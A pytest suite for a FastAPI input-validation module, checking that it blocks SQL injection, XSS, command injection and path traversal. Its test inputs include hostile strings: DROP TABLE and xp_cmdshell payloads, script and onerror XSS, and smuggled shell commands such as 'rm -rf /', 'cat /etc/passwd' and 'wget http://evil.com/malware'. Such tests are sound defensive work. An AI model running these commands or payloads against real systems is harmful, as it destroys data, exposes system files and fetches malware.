"""
Comprehensive Tests for Input Validation & Sanitization Module
Tests SQL injection, XSS, command injection, path traversal protection
Coverage target: ≥90% for security/input_validation.py

Author: DevSkyy Team
Version: 1.0.0
Python: >=3.11.0
Per CLAUDE.md Truth Protocol - Enterprise security standards
"""

from unittest.mock import AsyncMock, Mock

from fastapi import HTTPException, Request
import pytest

from security.input_validation import (
    AlphanumericValidator,
    ContentSecurityPolicy,
    EmailValidator,
    InputSanitizer,
    InputValidationMiddleware,
    RateLimitValidator,
    SecureString,
    URLValidator,
    csp,
    input_sanitizer,
    validation_middleware,
)


# ============================================================================
# TEST INPUT SANITIZER - SQL INJECTION
# ============================================================================


class TestSQLInjectionPrevention:
    """Test SQL injection prevention"""

    def test_sanitize_sql_valid_input(self):
        """Should allow valid SQL-safe input"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_sql("valid_username")
        assert result == "valid_username"

    def test_sanitize_sql_escapes_quotes(self):
        """Should escape single quotes"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_sql("O'Brien")
        assert result == "O''Brien"

    def test_sanitize_sql_union_select(self):
        """Should reject UNION SELECT injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException) as exc_info:
            sanitizer.sanitize_sql("admin' UNION SELECT * FROM users")
        assert exc_info.value.status_code == 400
        assert "SQL injection" in exc_info.value.detail

    def test_sanitize_sql_insert_injection(self):
        """Should reject INSERT injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("'; INSERT INTO users VALUES ('hacker', 'pass'); --")

    def test_sanitize_sql_drop_table(self):
        """Should reject DROP TABLE injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin'; DROP TABLE users; --")

    def test_sanitize_sql_update_injection(self):
        """Should reject UPDATE injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin'; UPDATE users SET password='hacked'; --")

    def test_sanitize_sql_delete_injection(self):
        """Should reject DELETE injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin'; DELETE FROM users; --")

    def test_sanitize_sql_exec_injection(self):
        """Should reject EXEC injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin'; EXEC xp_cmdshell('dir'); --")

    def test_sanitize_sql_comment_injection(self):
        """Should reject SQL comment injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin' --")
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin' #")

    def test_sanitize_sql_or_equals_injection(self):
        """Should reject OR 1=1 injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin' OR 1=1 --")

    def test_sanitize_sql_and_equals_injection(self):
        """Should reject AND 1=1 injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin' AND 1=1 --")

    def test_sanitize_sql_non_string_input(self):
        """Should handle non-string input"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_sql(12345)
        assert result == 12345

    def test_sanitize_sql_case_insensitive(self):
        """Should detect SQL injection case-insensitively"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_sql("admin' uNiOn SeLeCt * fRoM users")


# ============================================================================
# TEST INPUT SANITIZER - XSS PREVENTION
# ============================================================================


class TestXSSPrevention:
    """Test XSS prevention"""

    def test_sanitize_html_valid_input(self):
        """Should allow valid HTML-safe input"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html("Valid text content")
        assert "Valid text content" in result

    def test_sanitize_html_escapes_tags(self):
        """Should escape HTML tags"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html("<div>Content</div>")
        assert "&lt;div&gt;" in result
        assert "&lt;/div&gt;" in result

    def test_sanitize_html_script_tag(self):
        """Should remove <script> tags"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html("<script>alert('XSS')</script>")
        assert "script" not in result.lower() or "&lt;script&gt;" in result

    def test_sanitize_html_javascript_protocol(self):
        """Should remove javascript: protocol"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html("javascript:alert('XSS')")
        assert "javascript" not in result.lower() or "javascript:" not in result

    def test_sanitize_html_onerror_attribute(self):
        """Should remove onerror attribute"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html('<img src="x" onerror="alert(1)">')
        assert "onerror" not in result.lower() or "&lt;" in result

    def test_sanitize_html_onload_attribute(self):
        """Should remove onload attribute"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html('<body onload="alert(1)">')
        assert "onload" not in result.lower() or "&lt;" in result

    def test_sanitize_html_onclick_attribute(self):
        """Should remove onclick attribute"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html('<a onclick="alert(1)">Click</a>')
        assert "onclick" not in result.lower() or "&lt;" in result

    def test_sanitize_html_iframe_tag(self):
        """Should remove <iframe> tags"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html('<iframe src="evil.com"></iframe>')
        assert "iframe" not in result.lower() or "&lt;" in result

    def test_sanitize_html_embed_tag(self):
        """Should remove <embed> tags"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html('<embed src="evil.swf">')
        assert "embed" not in result.lower() or "&lt;" in result

    def test_sanitize_html_object_tag(self):
        """Should remove <object> tags"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html('<object data="evil.swf"></object>')
        assert "object" not in result.lower() or "&lt;" in result

    def test_sanitize_html_non_string_input(self):
        """Should handle non-string input"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html(12345)
        assert result == 12345

    def test_sanitize_html_escapes_special_chars(self):
        """Should escape special HTML characters"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_html("<>&\"'")
        assert "&lt;" in result
        assert "&gt;" in result
        assert "&amp;" in result


# ============================================================================
# TEST INPUT SANITIZER - COMMAND INJECTION
# ============================================================================


class TestCommandInjectionPrevention:
    """Test command injection prevention"""

    def test_sanitize_command_valid_input(self):
        """Should allow valid command-safe input"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_command("filename.txt")
        assert result == "filename.txt"

    def test_sanitize_command_cat_injection(self):
        """Should reject cat command injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file.txt; cat /etc/passwd")

    def test_sanitize_command_rm_injection(self):
        """Should reject rm command injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file.txt && rm -rf /")

    def test_sanitize_command_wget_injection(self):
        """Should reject wget command injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file.txt; wget http://evil.com/malware")

    def test_sanitize_command_curl_injection(self):
        """Should reject curl command injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file.txt | curl http://evil.com")

    def test_sanitize_command_substitution(self):
        """Should reject command substitution $(...)"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file$(whoami).txt")

    def test_sanitize_command_backtick_execution(self):
        """Should reject backtick command execution"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file`whoami`.txt")

    def test_sanitize_command_bash_injection(self):
        """Should reject bash injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file.txt; bash -c 'echo hacked'")

    def test_sanitize_command_python_injection(self):
        """Should reject python injection"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_command("file.txt | python -c 'import os; os.system(\"rm -rf /\")'")

    def test_sanitize_command_non_string_input(self):
        """Should handle non-string input"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_command(12345)
        assert result == 12345


# ============================================================================
# TEST INPUT SANITIZER - PATH TRAVERSAL
# ============================================================================


class TestPathTraversalPrevention:
    """Test path traversal prevention"""

    def test_sanitize_path_valid_input(self):
        """Should allow valid path"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_path("documents/file.txt")
        assert "file" in result

    def test_sanitize_path_dot_dot_slash(self):
        """Should reject ../ path traversal"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_path("../../etc/passwd")

    def test_sanitize_path_dot_dot_backslash(self):
        """Should reject ..\\ path traversal"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_path("..\\..\\windows\\system32")

    def test_sanitize_path_url_encoded(self):
        """Should reject URL-encoded path traversal"""
        sanitizer = InputSanitizer()
        with pytest.raises(HTTPException):
            sanitizer.sanitize_path("%2e%2e/etc/passwd")

    def test_sanitize_path_removes_dangerous_chars(self):
        """Should remove dangerous characters"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_path("file@#$.txt")
        # Should remove @, #, $
        assert "@" not in result
        assert "#" not in result
        assert "$" not in result

    def test_sanitize_path_non_string_input(self):
        """Should handle non-string input"""
        sanitizer = InputSanitizer()
        result = sanitizer.sanitize_path(12345)
        assert result == 12345


# ============================================================================
# TEST VALIDATION MODELS
# ============================================================================


class TestValidationModels:
    """Test Pydantic validation models"""

    def test_email_validator_valid(self):
        """Should accept valid email"""
        email = EmailValidator(email="test@example.com")
        assert email.email == "test@example.com"

    def test_email_validator_invalid(self):
        """Should reject invalid email"""
        with pytest.raises(Exception):  # Pydantic ValidationError
            EmailValidator(email="invalid-email")

    def test_url_validator_valid(self):
        """Should accept valid URL"""
        url = URLValidator(url="https://example.com/path")
        assert url.url == "https://example.com/path"

    def test_url_validator_http(self):
        """Should accept HTTP URL"""
        url = URLValidator(url="http://example.com")
        assert url.url == "http://example.com"

    def test_url_validator_invalid(self):
        """Should reject invalid URL"""
        with pytest.raises(Exception):  # Pydantic ValidationError
            URLValidator(url="not-a-url")

    def test_alphanumeric_validator_valid(self):
        """Should accept alphanumeric value"""
        value = AlphanumericValidator(value="test_value-123")
        assert value.value == "test_value-123"

    def test_alphanumeric_validator_invalid(self):
        """Should reject non-alphanumeric value"""
        with pytest.raises(Exception):  # Pydantic ValidationError
            AlphanumericValidator(value="test@value!")


# ============================================================================
# TEST INPUT VALIDATION MIDDLEWARE
# ============================================================================


class TestInputValidationMiddleware:
    """Test input validation middleware"""

    @pytest.mark.asyncio
    async def test_validate_request_data_dict(self):
        """Should validate dictionary data"""
        middleware = InputValidationMiddleware()
        data = {"username": "test", "email": "test@example.com"}
        result = await middleware.validate_request_data(data)
        assert result == data

    @pytest.mark.asyncio
    async def test_validate_request_data_list(self):
        """Should validate list data"""
        middleware = InputValidationMiddleware()
        data = ["item1", "item2", "item3"]
        result = await middleware.validate_request_data(data)
        assert result == data

    @pytest.mark.asyncio
    async def test_validate_request_data_string(self):
        """Should validate string data"""
        middleware = InputValidationMiddleware()
        data = "valid string"
        result = await middleware.validate_request_data(data)
        assert result == data

    @pytest.mark.asyncio
    async def test_validate_request_data_nested_dict(self):
        """Should validate nested dictionary"""
        middleware = InputValidationMiddleware()
        data = {
            "user": {
                "name": "test",
                "details": {"email": "test@example.com"},
            }
        }
        result = await middleware.validate_request_data(data)
        assert result["user"]["name"] == "test"

    @pytest.mark.asyncio
    async def test_validate_request_data_rejects_sql_injection(self):
        """Should reject SQL injection in data"""
        middleware = InputValidationMiddleware(strict_mode=True)
        data = "admin' OR 1=1 --"
        with pytest.raises(HTTPException):
            await middleware.validate_request_data(data)

    @pytest.mark.asyncio
    async def test_validate_request_data_non_strict_mode(self):
        """Should sanitize instead of rejecting in non-strict mode"""
        middleware = InputValidationMiddleware(strict_mode=False)
        data = "admin' OR 1=1 --"
        result = await middleware.validate_request_data(data)
        # Should be sanitized instead of raising exception
        assert isinstance(result, str)

    @pytest.mark.asyncio
    async def test_validate_request_data_non_string(self):
        """Should handle non-string data"""
        middleware = InputValidationMiddleware()
        data = 12345
        result = await middleware.validate_request_data(data)
        assert result == 12345

    @pytest.mark.asyncio
    async def test_middleware_post_request(self):
        """Should validate POST request"""
        middleware = InputValidationMiddleware()

        # Mock request
        mock_request = Mock(spec=Request)
        mock_request.method = "POST"
        mock_request.url.path = "/test"
        mock_request.json = AsyncMock(return_value={"username": "test"})

        # Mock call_next
        mock_response = Mock()
        call_next = AsyncMock(return_value=mock_response)

        result = await middleware(mock_request, call_next)
        assert result == mock_response

    @pytest.mark.asyncio
    async def test_middleware_get_request(self):
        """Should skip validation for GET request"""
        middleware = InputValidationMiddleware()

        # Mock request
        mock_request = Mock(spec=Request)
        mock_request.method = "GET"

        # Mock call_next
        mock_response = Mock()
        call_next = AsyncMock(return_value=mock_response)

        result = await middleware(mock_request, call_next)
        assert result == mock_response

    @pytest.mark.asyncio
    async def test_middleware_invalid_json(self):
        """Should handle invalid JSON gracefully"""
        middleware = InputValidationMiddleware()

        # Mock request with invalid JSON
        mock_request = Mock(spec=Request)
        mock_request.method = "POST"
        mock_request.json = AsyncMock(side_effect=ValueError("Invalid JSON"))

        # Mock call_next
        mock_response = Mock()
        call_next = AsyncMock(return_value=mock_response)

        result = await middleware(mock_request, call_next)
        assert result == mock_response

    @pytest.mark.asyncio
    async def test_middleware_blocks_malicious_request(self):
        """Should block malicious request"""
        middleware = InputValidationMiddleware(strict_mode=True)

        # Mock request with SQL injection
        mock_request = Mock(spec=Request)
        mock_request.method = "POST"
        mock_request.url.path = "/test"
        mock_request.json = AsyncMock(return_value={"username": "admin' OR 1=1 --"})

        # Mock call_next
        call_next = AsyncMock()

        result = await middleware(mock_request, call_next)
        # Should return HTTPException instead of calling next
        assert isinstance(result, HTTPException)


# ============================================================================
# TEST SECURE STRING
# ============================================================================


class TestSecureString:
    """Test SecureString custom type"""

    def test_secure_string_validation(self):
        """Should validate and sanitize string"""
        validators = list(SecureString.__get_validators__())
        assert len(validators) > 0

    def test_secure_string_validate_method(self):
        """Should validate string input"""
        result = SecureString.validate("test string")
        assert isinstance(result, str)

    def test_secure_string_validate_non_string(self):
        """Should reject non-string input"""
        with pytest.raises(TypeError):
            SecureString.validate(12345)

    def test_secure_string_sanitizes_html(self):
        """Should sanitize HTML in string"""
        result = SecureString.validate("<script>alert('XSS')</script>")
        # Should be sanitized
        assert "script" not in result.lower() or "&lt;" in result


# ============================================================================
# TEST RATE LIMIT VALIDATOR
# ============================================================================


class TestRateLimitValidator:
    """Test rate limit validation"""

    def test_validate_rate_limit_valid(self):
        """Should accept valid rate limit"""
        result = RateLimitValidator.validate_rate_limit(100, 60)
        assert result is True

    def test_validate_rate_limit_min_values(self):
        """Should accept minimum values"""
        result = RateLimitValidator.validate_rate_limit(1, 1)
        assert result is True

    def test_validate_rate_limit_max_values(self):
        """Should accept maximum values"""
        result = RateLimitValidator.validate_rate_limit(10000, 3600)
        assert result is True

    def test_validate_rate_limit_too_low_limit(self):
        """Should reject limit below 1"""
        with pytest.raises(ValueError, match="Rate limit"):
            RateLimitValidator.validate_rate_limit(0, 60)

    def test_validate_rate_limit_too_high_limit(self):
        """Should reject limit above 10000"""
        with pytest.raises(ValueError, match="Rate limit"):
            RateLimitValidator.validate_rate_limit(10001, 60)

    def test_validate_rate_limit_too_low_window(self):
        """Should reject window below 1"""
        with pytest.raises(ValueError, match="Time window"):
            RateLimitValidator.validate_rate_limit(100, 0)

    def test_validate_rate_limit_too_high_window(self):
        """Should reject window above 3600"""
        with pytest.raises(ValueError, match="Time window"):
            RateLimitValidator.validate_rate_limit(100, 3601)


# ============================================================================
# TEST CONTENT SECURITY POLICY
# ============================================================================


class TestContentSecurityPolicy:
    """Test Content Security Policy headers"""

    def test_get_csp_header(self):
        """Should return CSP headers"""
        csp_obj = ContentSecurityPolicy()
        headers = csp_obj.get_csp_header()

        assert "Content-Security-Policy" in headers
        assert "X-Content-Type-Options" in headers
        assert "X-Frame-Options" in headers
        assert "X-XSS-Protection" in headers
        assert "Strict-Transport-Security" in headers

    def test_csp_header_content(self):
        """Should include proper CSP directives"""
        csp_obj = ContentSecurityPolicy()
        headers = csp_obj.get_csp_header()

        csp_content = headers["Content-Security-Policy"]
        assert "default-src 'self'" in csp_content
        assert "script-src" in csp_content
        assert "style-src" in csp_content
        assert "frame-ancestors 'none'" in csp_content

    def test_x_frame_options_deny(self):
        """Should set X-Frame-Options to DENY"""
        csp_obj = ContentSecurityPolicy()
        headers = csp_obj.get_csp_header()
        assert headers["X-Frame-Options"] == "DENY"

    def test_x_content_type_options_nosniff(self):
        """Should set X-Content-Type-Options to nosniff"""
        csp_obj = ContentSecurityPolicy()
        headers = csp_obj.get_csp_header()
        assert headers["X-Content-Type-Options"] == "nosniff"

    def test_strict_transport_security(self):
        """Should set HSTS header"""
        csp_obj = ContentSecurityPolicy()
        headers = csp_obj.get_csp_header()
        assert "max-age" in headers["Strict-Transport-Security"]
        assert "includeSubDomains" in headers["Strict-Transport-Security"]


# ============================================================================
# TEST GLOBAL INSTANCES
# ============================================================================


class TestGlobalInstances:
    """Test global singleton instances"""

    def test_input_sanitizer_instance(self):
        """Should have global input_sanitizer instance"""
        assert input_sanitizer is not None
        assert isinstance(input_sanitizer, InputSanitizer)

    def test_validation_middleware_instance(self):
        """Should have global validation_middleware instance"""
        assert validation_middleware is not None
        assert isinstance(validation_middleware, InputValidationMiddleware)
        assert validation_middleware.strict_mode is True

    def test_csp_instance(self):
        """Should have global csp instance"""
        assert csp is not None
        assert isinstance(csp, ContentSecurityPolicy)


# ============================================================================
# INTEGRATION TESTS
# ============================================================================


class TestInputValidationIntegration:
    """Integration tests for input validation system"""

    @pytest.mark.asyncio
    async def test_full_validation_flow(self):
        """Test complete validation flow"""
        middleware = InputValidationMiddleware(strict_mode=True)

        # Test valid data
        valid_data = {
            "username": "testuser",
            "email": "test@example.com",
            "metadata": {"key": "value"},
        }

        result = await middleware.validate_request_data(valid_data)
        assert result == valid_data

    @pytest.mark.asyncio
    async def test_validation_with_all_attack_vectors(self):
        """Test validation against multiple attack vectors"""
        middleware = InputValidationMiddleware(strict_mode=True)

        # SQL injection
        with pytest.raises(HTTPException):
            await middleware.validate_request_data("admin' OR 1=1 --")

        # Command injection
        with pytest.raises(HTTPException):
            await middleware.validate_request_data("file.txt; rm -rf /")

        # Path traversal
        with pytest.raises(HTTPException):
            await middleware.validate_request_data("../../etc/passwd")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--cov=security.input_validation", "--cov-report=term-missing"])
